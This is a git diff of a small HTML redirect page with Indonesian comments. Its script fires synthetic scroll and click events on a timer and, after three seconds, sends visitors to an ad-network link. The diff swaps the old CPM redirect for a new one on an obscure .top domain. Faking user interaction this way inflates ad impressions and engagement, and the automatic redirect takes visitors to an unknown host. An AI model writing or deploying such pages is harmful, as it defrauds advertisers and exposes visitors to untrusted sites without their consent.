@@ -6,7 +6,13 @@
   <meta name="robots" content="noindex, nofollow" />
   <title>Redirecting...</title>
   <style>
-    body { font-family: Arial; background: #fafafa; text-align: center; padding-top: 100px; color: #333; }
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #fafafa;
+      text-align: center;
+      padding-top: 100px;
+      color: #333;
+    }
   </style>
 </head>
 <body>
@@ -14,25 +20,28 @@
   <p>We are redirecting you to the page</p>
 
   <script>
-    // Mensimulasikan scroll
+    // Simulasi scroll
     function simulateScroll() {
-      window.scrollBy(0, 500);  // Scroll 500px ke bawah
-      setTimeout(simulateScroll, 3000);  // Ulangi setiap 3 detik
+      window.scrollBy(0, 500); // Scroll ke bawah 500px
+      setTimeout(simulateScroll, 3000); // Ulangi setiap 3 detik
     }
 
-    // Mensimulasikan klik
+    // Simulasi klik
     function simulateClick() {
-      var clickEvent = new MouseEvent('click', { bubbles: true, cancelable: true });
+      const clickEvent = new MouseEvent('click', {
+        bubbles: true,
+        cancelable: true
+      });
       document.body.dispatchEvent(clickEvent);
       setTimeout(simulateClick, 5000); // Ulangi setiap 5 detik
     }
 
-    // Simulasi interaksi dengan halaman
+    // Redirect setelah 3 detik
     setTimeout(() => {
-      window.location.href = "https://wwp.ailony.com/redirect-zone/68c24fd3";  // Ganti dengan link CPM yang baru
-    }, 3000);  // Delay 3 detik sebelum redirect
+      window.location.href = "https://whoockeg.top/4/9209440";
+    }, 3000);
 
-    // Start simulasi interaksi
+    // Mulai simulasi interaksi
     simulateScroll();
     simulateClick();
   </script>
